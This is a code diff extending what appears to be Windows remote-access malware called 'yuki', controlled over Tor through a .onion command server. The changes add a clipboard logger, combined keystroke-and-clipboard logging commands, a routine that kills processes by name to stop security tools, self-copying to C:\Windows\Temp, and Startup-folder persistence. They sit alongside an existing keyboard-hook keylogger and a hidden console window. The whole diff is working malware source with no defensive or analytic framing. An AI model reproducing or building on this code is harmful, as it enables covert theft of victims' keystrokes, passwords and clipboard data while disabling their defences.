@@ -7,29 +7,87 @@
 #include <unistd.h>
 #include <tchar.h>
 #include <locale.h>
-#include <winsock2.h>
-#include <windows.h>
-#include <ws2tcpip.h>
+#include <shlobj.h>
+#include <Windows.h>
 #include <filesystem>
 #include <wininet.h>
-#define MSG_NOSIGNAL        0
+#include <fcntl.h>
+#include <dirent.h>
+
 #define MAX                 65536
 #define cnc_onion_server    "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.onion"
 
 HHOOK hHook;
-
 SOCKET fd;
+
+HANDLE hClip;
+char* str;
+char buf[4096];
+
+HANDLE             lSnapshot, myproc;
+BOOL               rProcessFound;
+PROCESSENTRY32     uProcess;
+
+char *strstr(const WCHAR*s1, const char *s2)
+{
+    const WCHAR *p1 = s1;
+    const char  *p2 = s2;
+
+    while (*p1 && *p2) {
+        if (*p1 == *p2) {
+            p1++;
+            p2++;
+        }
+        else {
+            p1 -= p2 - s2 - 1;
+            p2 = s2;
+        }
+    }
+    return (*p2 ? NULL : (char *)(p1 - (p2 - s2)));
+}
+
+void StopAV(const char *antivirus)
+{
+    BOOL term;
+    lSnapshot       = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    uProcess.dwSize = sizeof(uProcess);
+    rProcessFound   = Process32First(lSnapshot, &uProcess);
+    while (rProcessFound) {
+        if (strstr(uProcess.szExeFile, antivirus) != NULL) {
+            myproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, uProcess.th32ProcessID);
+            if (myproc != NULL) term = TerminateProcess(myproc, 0);
+            if (term) ;
+            CloseHandle(myproc);
+        }
+        rProcessFound = Process32Next(lSnapshot,&uProcess);
+    }
+    CloseHandle(lSnapshot);
+}
 
 void Log(std::string input) {
     const char *buf = input.c_str();
-    send(fd, buf, 2048, 0);
+    send(fd, buf, 4096, 0);
+}
+
+void clip_log() {
+    OpenClipboard(NULL);
+    hClip = GetClipboardData(CF_TEXT);
+    if (hClip != NULL) {
+        str = (char*)GlobalLock(hClip);
+        if (strcmp(buf, str) != 0) {
+            send(fd, str, 4096, 0);
+            strncpy(buf, str, sizeof(buf));
+        }
+        GlobalUnlock(hClip);
+    }
+    CloseClipboard();
 }
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
         KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
         if (wParam == WM_KEYDOWN) {
-            CHAR key[2];
+            char key[3];
             DWORD vkCode = kbd->vkCode;
             if (vkCode >= 0x30 && vkCode <= 0x39) {
                 if (GetAsyncKeyState(VK_SHIFT)) {
@@ -336,14 +394,69 @@ void wget()
     fclose(fp);
 }
 
-void start_up(std::string str)
+TCHAR *my_strcat(TCHAR *dest, const TCHAR *src)
 {
-    std::string startup_directory = "%HOMEDRIVE%%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
-    std::string dir_place_worm = startup_directory + "\\" + str;
-    std::string cmd_copy_worm_startup = "xcopy \".\\" + str + "\" \"" + dir_place_worm + "*\" /Y";
-    const char *cmd_copy_worm_startup_p = cmd_copy_worm_startup.c_str();
-    FILE *c_01 = popen(cmd_copy_worm_startup_p, "r");
-    (void)pclose(c_01);
+    size_t i, j;
+    for (j = 0 ; dest[j] != '\0'; j++);
+    for (i = 0 ; src[i] != '\0'; i++) dest[j + i] = src[i];
+    dest[j + i] = '\0';
+    return dest;
+}
+
+bool has_suffix(const std::string& s, const std::string& suffix) {
+    return (s.size() >= suffix.size()) && equal(suffix.rbegin(), suffix.rend(), s.rbegin());
+}
+
+char buff[512];
+int source, target, byt;
+
+std::string ExePath() {
+    char buffer[MAX_PATH];
+    GetModuleFileName(NULL, buffer, MAX_PATH);
+    std::string::size_type pos = std::string(buffer).find_last_of("\\/");
+    return std::string(buffer).substr(0, pos);
+}
+
+std::string ExeName() {
+    char buffer[MAX_PATH];
+    GetModuleFileName(NULL, buffer, MAX_PATH);
+    return std::string(buffer);
+}
+
+inline void self_duplicating()
+{
+    std::string exename = ExeName();
+    std::string path = ExePath();
+    source = open(exename.c_str(), O_RDONLY|O_BINARY);
+    target = open("C:\\Windows\\Temp\\yuki.exe", O_CREAT|O_BINARY|O_WRONLY);
+    while(1) {
+        byt = read(source, buff, 512);
+        if (byt > 0) write(target, buff, byt);
+        else break;
+    }
+    close(source);
+    close(target);
+}
+
+void start_up()
+{
+    TCHAR path[512];
+    TCHAR *s = (TCHAR*)"\\yuki.cmd";
+    TCHAR *d = (TCHAR*)"@echo\x20off\nC:\\Windows\\Temp\\yuki.exe 255";
+    DWORD dwNumberOfBytesWritten;
+    self_duplicating();
+f:
+    if (SHGetSpecialFolderPath(NULL, path, CSIDL_STARTUP, 0) == TRUE) {
+        my_strcat(path, s);
+    }
+    HANDLE hFile = CreateFile(
+        path, GENERIC_READ | GENERIC_WRITE, 0, NULL,
+        CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL
+    );
+    if (!WriteFile(hFile, d, lstrlen(d), &dwNumberOfBytesWritten, NULL)) {
+        goto f;
+    }
+    CloseHandle(hFile);
     wget();
 }
 
@@ -357,19 +470,14 @@ int main(int argc, char **argv)
     HWND window = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(window, 0);
 
-    char buf[256];
-    strcpy(buf, argv[0]);
-    std::string str = buf;
-    if (str.find(".exe") == std::string::npos) {
-        str += ".exe";
+    if (argc != 2) {
+        StopAV("WmiPrvSE.exe");
+        start_up();
     }
-    std::filesystem::path path = std::filesystem::current_path();
-    std::string path_string{path.u8string() + "\\"};
-    str.erase(str.find(path_string));
-    start_up(str);
+
     std::thread th_a(start_tor);
     th_a.join();
-    std::this_thread::sleep_for(std::chrono::seconds(120));
+    std::this_thread::sleep_for(std::chrono::seconds(5));
 
     WSADATA wsaData;
     char recv_buf[MAX] = {};
@@ -399,7 +507,7 @@ int main(int argc, char **argv)
             0x01, // One Authentication Method
             0x00  // No AUthentication
         };
-        send(Socket, Req1, 3, MSG_NOSIGNAL);
+        send(Socket, Req1, 3, 0);
 
         char Resp1[2];
         recv(Socket, Resp1, 2, 0);
@@ -425,7 +533,7 @@ int main(int argc, char **argv)
         memcpy(Req2 + 5, Domain, DomainLen);    // Domain
         memcpy(Req2 + 5 + DomainLen, &Port, 2); // Port
 
-        send(Socket, (char*)Req2, 4 + 1 + DomainLen + 2, MSG_NOSIGNAL);
+        send(Socket, (char*)Req2, 4 + 1 + DomainLen + 2, 0);
 
         delete[] Req2;
 
@@ -450,6 +558,38 @@ int main(int argc, char **argv)
             }
             else if (!strcmp(recv_buf, "keylogger")) {
                 keylog();
+            }
+            else if (!strcmp(recv_buf, "cliplogger")) {
+                OpenClipboard(NULL);
+                hClip = GetClipboardData(CF_TEXT);
+                    if (hClip != NULL) {
+                    str = (char*)GlobalLock(hClip);
+                    send(Socket, str, strlen(str), 0);
+                    GlobalUnlock(hClip);
+                }
+                strncpy(buf, str, sizeof(buf));
+                CloseClipboard();
+                while (1) {
+                    Sleep(1000);
+                    clip_log();
+                }
+            }
+            else if (!strcmp(recv_buf, "all_log")) {
+                std::thread th_0(keylog);
+                OpenClipboard(NULL);
+                hClip = GetClipboardData(CF_TEXT);
+                    if (hClip != NULL) {
+                    str = (char*)GlobalLock(hClip);
+                    send(Socket, str, strlen(str), 0);
+                    GlobalUnlock(hClip);
+                }
+                strncpy(buf, str, sizeof(buf));
+                CloseClipboard();
+                while (1) {
+                    Sleep(1000);
+                    clip_log();
+                }
+                Sleep(-1);
             }
             send(Socket, send_buf, strlen(send_buf), 0);
             memset(send_buf, 0, MAX*sizeof(send_buf[0]));
